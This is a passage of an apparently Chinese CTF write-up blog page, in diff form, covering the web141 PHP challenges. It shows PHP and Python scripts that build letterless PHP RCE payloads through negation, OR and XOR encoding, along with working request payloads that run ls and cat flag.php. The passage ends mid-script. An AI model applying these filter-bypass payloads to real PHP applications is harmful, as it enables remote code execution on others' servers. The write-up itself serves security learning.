@@ -1,0 +1,477 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="web141开启容器 代码审计  $v3需要非字母开头  \W+ ：匹配一个或多个非单词字符。所谓“非单词字符”，指的是除字母（a-z，A-Z）、数字（0-9）和下划线（_）之外的任何字符，比如标点符号、空格、特殊符号等。   简单来说就是无字母RCE 总结一下，无字母RCE包括取反、异或、或、自增 这里没有其他字符过滤，应该是都可以 然后绕过 return 的方法要利用以下的 trick  在">
+<meta property="og:type" content="article">
+<meta property="og:title" content="web141-150plus">
+<meta property="og:url" content="https://youngking-gfy.github.io/2025/03/24/web141-150plus/index.html">
+<meta property="og:site_name" content="Youngking&#39;s Blog">
+<meta property="og:description" content="web141开启容器 代码审计  $v3需要非字母开头  \W+ ：匹配一个或多个非单词字符。所谓“非单词字符”，指的是除字母（a-z，A-Z）、数字（0-9）和下划线（_）之外的任何字符，比如标点符号、空格、特殊符号等。   简单来说就是无字母RCE 总结一下，无字母RCE包括取反、异或、或、自增 这里没有其他字符过滤，应该是都可以 然后绕过 return 的方法要利用以下的 trick  在">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/24/web141-150plus/file-20250324115430183.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/24/web141-150plus/file-20250324120622999.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/24/web141-150plus/file-20250324120826803.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/24/web141-150plus/file-20250324120946461.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/24/web141-150plus/file-20250324121343828.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/24/web141-150plus/file-20250324121659229.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/24/web141-150plus/file-20250324121805521.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/24/web141-150plus/file-20250324123159835.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/24/web141-150plus/file-20250324123609895.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/24/web141-150plus/file-20250324123725690.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/24/web141-150plus/file-20250324124630113.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/24/web141-150plus/file-20250324125203598.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/24/web141-150plus/file-20250324125644563.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/24/web141-150plus/file-20250324125731285.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/24/web141-150plus/file-20250324130529294.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/24/web141-150plus/file-20250324131048559.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/24/web141-150plus/file-20250324131148454.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/24/web141-150plus/file-20250324131315332.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/24/web141-150plus/file-20250324131602737.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/24/web141-150plus/file-20250324131834257.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/24/web141-150plus/file-20250324133156075.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/24/web141-150plus/file-20250324132552172.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/24/web141-150plus/file-20250324133337037.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/24/web141-150plus/file-20250324133731948.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/24/web141-150plus/file-20250324133830934.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/24/web141-150plus/file-20250324134147954.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/24/web141-150plus/file-20250324134246491.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/24/web141-150plus/file-20250324134307095.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/24/web141-150plus/file-20250324134345572.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/24/web141-150plus/file-20250324135059429.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/24/web141-150plus/file-20250324135042547.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/24/web141-150plus/file-20250324135819160.png">
+<meta property="article:published_time" content="2025-03-24T03:49:42.000Z">
+<meta property="article:modified_time" content="2025-03-24T05:58:22.958Z">
+<meta property="article:author" content="Y0ungK1ng">
+<meta property="article:tag" content="php特性">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://youngking-gfy.github.io/2025/03/24/web141-150plus/file-20250324115430183.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>web141-150plus</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/youngking-gfy">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/03/23/web133-web140/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://youngking-gfy.github.io/2025/03/24/web141-150plus/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://youngking-gfy.github.io/2025/03/24/web141-150plus/&text=web141-150plus"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://youngking-gfy.github.io/2025/03/24/web141-150plus/&title=web141-150plus"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://youngking-gfy.github.io/2025/03/24/web141-150plus/&is_video=false&description=web141-150plus"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=web141-150plus&body=Check out this article: https://youngking-gfy.github.io/2025/03/24/web141-150plus/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://youngking-gfy.github.io/2025/03/24/web141-150plus/&title=web141-150plus"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://youngking-gfy.github.io/2025/03/24/web141-150plus/&title=web141-150plus"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://youngking-gfy.github.io/2025/03/24/web141-150plus/&title=web141-150plus"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://youngking-gfy.github.io/2025/03/24/web141-150plus/&title=web141-150plus"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://youngking-gfy.github.io/2025/03/24/web141-150plus/&name=web141-150plus&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://youngking-gfy.github.io/2025/03/24/web141-150plus/&t=web141-150plus"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#web141"><span class="toc-number">1.</span> <span class="toc-text">web141</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%96%E5%8F%8D"><span class="toc-number">1.1.</span> <span class="toc-text">取反</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%88%96"><span class="toc-number">1.2.</span> <span class="toc-text">或</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BC%82%E6%88%96"><span class="toc-number">1.3.</span> <span class="toc-text">异或</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%87%AA%E5%A2%9E"><span class="toc-number">1.4.</span> <span class="toc-text">自增</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web142"><span class="toc-number">2.</span> <span class="toc-text">web142</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web143"><span class="toc-number">3.</span> <span class="toc-text">web143</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web144"><span class="toc-number">4.</span> <span class="toc-text">web144</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web145"><span class="toc-number">5.</span> <span class="toc-text">web145</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%A8or"><span class="toc-number">5.1.</span> <span class="toc-text">用or</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%A8%E5%8F%96%E5%8F%8D"><span class="toc-number">5.2.</span> <span class="toc-text">用取反</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web146"><span class="toc-number">6.</span> <span class="toc-text">web146</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web147"><span class="toc-number">7.</span> <span class="toc-text">web147</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web148"><span class="toc-number">8.</span> <span class="toc-text">web148</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web149"><span class="toc-number">9.</span> <span class="toc-text">web149</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web150"><span class="toc-number">10.</span> <span class="toc-text">web150</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web150plus"><span class="toc-number">11.</span> <span class="toc-text">web150plus</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        web141-150plus
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Y0ungK1ng</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-03-24T03:49:42.000Z" class="dt-published" itemprop="datePublished">2025-03-24</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E6%B8%97%E9%80%8F%E5%AE%89%E5%85%A8/">渗透安全</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/php%E7%89%B9%E6%80%A7/" rel="tag">php特性</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h3 id="web141"><a href="#web141" class="headerlink" title="web141"></a>web141</h3><p>开启容器</p>
+<p>代码审计</p>
+<p><img src="/2025/03/24/web141-150plus/file-20250324115430183.png"></p>
+<p><code>$v3</code>需要非字母开头</p>
+<ul>
+<li><code>\W+</code> ：匹配一个或多个非单词字符。所谓“非单词字符”，指的是除字母（a-z，A-Z）、数字（0-9）和下划线（_）之外的任何字符，比如标点符号、空格、特殊符号等。</li>
+</ul>
+<p> 简单来说就是无字母RCE</p>
+<p>总结一下，无字母RCE包括取反、异或、或、自增</p>
+<p>这里没有其他字符过滤，应该是都可以</p>
+<p>然后绕过 return 的方法要利用以下的 trick</p>
+<blockquote>
+<p>在 PHP 中, 函数与数字进行运算的时候, 函数能够被正常执行</p>
+</blockquote>
+<h4 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h4><p>构造脚本</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your function: &#x27;</span>);</span><br><span class="line"><span class="variable">$system</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN));</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your command: &#x27;</span>);</span><br><span class="line"><span class="variable">$command</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;[*] (~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$system</span>).<span class="string">&#x27;)(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$command</span>).<span class="string">&#x27;);&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v1=0&amp;v2=0&amp;v3=-(~%8C%86%8C%8B%9A%92)(~%93%8C)-</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/03/24/web141-150plus/file-20250324120622999.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v1=0&amp;v2=0&amp;v3=-(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%93%9E%98%D1%8F%97%8F)-</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/03/24/web141-150plus/file-20250324120826803.png"></p>
+<h4 id="或"><a href="#或" class="headerlink" title="或"></a>或</h4><p>构造php脚本</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;or_rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">                        <span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">                        <span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$preg</span> = <span class="string">&#x27;/[0-9a-z]/i&#x27;</span>;<span class="comment">//������Ŀ�����������ʽ�޸ļ���</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">	                <span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line">                <span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">                <span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)|<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line">                        <span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br></pre></td></tr></table></figure>
+
+<p>构造python脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># author yu22x</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=<span class="built_in">open</span>(<span class="string">&quot;or_rce.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line"></span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;|\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function��&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command��&quot;</span>))+<span class="string">&quot;;&quot;</span></span><br><span class="line">   <span class="built_in">print</span>(param)</span><br></pre></td></tr></table></figure>
+
+<p>ls一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v1=0&amp;v2=0&amp;v3=-(&quot;%13%19%13%14%05%0d&quot;|&quot;%60%60%60%60%60%60&quot;)(&quot;%0c%13&quot;|&quot;%60%60&quot;)-</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/03/24/web141-150plus/file-20250324120946461.png"></p>
+<p>tac一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v1=0&amp;v2=0&amp;v3=-(&quot;%13%19%13%14%05%0d&quot;|&quot;%60%60%60%60%60%60&quot;)(&quot;%14%01%03%00%06%0c%01%07%00%10%08%10&quot;|&quot;%60%60%60%20%60%60%60%60%2e%60%60%60&quot;)-</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/03/24/web141-150plus/file-20250324121343828.png"></p>
+<h4 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h4><p>php构造脚本</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*author yu22x*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">                        <span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">                        <span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$preg</span> = <span class="string">&#x27;/[a-z0-9]/i&#x27;</span>; <span class="comment">//根据题目给的正则表达式修改即叄1�7</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">	                <span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line">                <span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">                <span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)^<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span 